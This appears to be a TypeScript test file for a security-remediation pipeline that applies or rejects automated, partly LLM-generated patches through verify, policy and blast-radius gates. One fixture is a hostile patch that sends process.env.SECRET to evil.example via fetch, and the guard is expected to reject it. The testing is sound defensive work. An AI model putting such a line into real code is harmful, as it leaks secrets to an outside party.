/**
 * Remediation pipeline tests: a verified codemod patch is applied; a patch that
 * doesn't clear the finding is rejected by the verify gate; an out-of-policy
 * patch is rejected by the policy gate; a finding with no fix is rejected.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { remediateFindings, configToggleCodemod } from "../src/index.js";
import type { Finding, Patch } from "../src/index.js";

function tlsFinding(file = "server.ts"): Finding {
  return {
    ruleId: "tls-legacy-version",
    title: "t",
    category: "tls",
    severity: "medium",
    confidence: "high",
    hndl: false,
    message: "m",
    location: { file, line: 1 },
  };
}
const LEGACY = "const opts = { minVersion: 'TLSv1.1' };\n";
const policy = { findingFiles: new Set(["server.ts"]), manifestFiles: new Set<string>() };

test("a verified codemod patch is applied", async () => {
  const res = await remediateFindings([tlsFinding()], {
    readContent: () => LEGACY,
    patchSource: (f, content) => configToggleCodemod.apply(content, f),
    policy,
  });
  assert.equal(res.applied.length, 1);
  assert.equal(res.rejected.length, 0);
  assert.match(res.applied[0].patch.newContent, /TLSv1\.3/);
});

test("a patch that does not clear the finding is rejected by the verify gate", async () => {
  const noopPatch: Patch = {
    path: "server.ts",
    newContent: LEGACY, // unchanged → finding still present
    ruleId: "tls-legacy-version",
    source: "llm",
  };
  const res = await remediateFindings([tlsFinding()], {
    readContent: () => LEGACY,
    patchSource: () => noopPatch,
    policy,
  });
  assert.equal(res.applied.length, 0);
  assert.equal(res.rejected.length, 1);
  assert.match(res.rejected[0].reason, /verify_fix/);
});

test("an out-of-policy patch is rejected by the policy gate", async () => {
  const strayPatch: Patch = {
    path: ".github/workflows/ci.yml",
    newContent: "x",
    ruleId: "tls-legacy-version",
    source: "llm",
  };
  const res = await remediateFindings([tlsFinding()], {
    readContent: () => LEGACY,
    patchSource: () => strayPatch,
    policy,
  });
  assert.equal(res.applied.length, 0);
  assert.match(res.rejected[0].reason, /protected|policy/);
});

test("an LLM patch that introduces a network/exec sink is rejected (blast-radius guard)", async () => {
  const evil: Patch = {
    path: "server.ts",
    newContent: "fetch('https://evil.example/x?d=' + process.env.SECRET);\n",
    ruleId: "tls-legacy-version",
    source: "llm",
  };
  const res = await remediateFindings([tlsFinding()], {
    readContent: () => LEGACY,
    patchSource: () => evil,
    policy,
  });
  assert.equal(res.applied.length, 0);
  assert.match(res.rejected[0].reason, /sink/i);
});

test("an LLM patch that rewrites too much is rejected (blast-radius guard)", async () => {
  const huge =
    "const opts = { minVersion: 'TLSv1.3' };\n" +
    Array.from({ length: 80 }, (_, i) => `const x${i} = ${i};`).join("\n") +
    "\n";
  const bigPatch: Patch = {
    path: "server.ts",
    newContent: huge,
    ruleId: "tls-legacy-version",
    source: "llm",
  };
  const res = await remediateFindings([tlsFinding()], {
    readContent: () => LEGACY,
    patchSource: () => bigPatch,
    policy,
  });
  assert.equal(res.applied.length, 0);
  assert.match(res.rejected[0].reason, /too broad|changes \d+ lines/);
});

test("a small, sink-free LLM patch that clears the finding is still applied", async () => {
  const good: Patch = {
    path: "server.ts",
    newContent: "const opts = { minVersion: 'TLSv1.3' };\n",
    ruleId: "tls-legacy-version",
    source: "llm",
  };
  const res = await remediateFindings([tlsFinding()], {
    readContent: () => LEGACY,
    patchSource: () => good,
    policy,
  });
  assert.equal(res.applied.length, 1, "the guard does not over-reject a bounded, safe fix");
});

test("a finding with no available fix is rejected cleanly", async () => {
  const res = await remediateFindings([tlsFinding()], {
    readContent: () => LEGACY,
    patchSource: () => null,
    policy,
  });
  assert.equal(res.applied.length, 0);
  assert.match(res.rejected[0].reason, /no deterministic fix/);
});
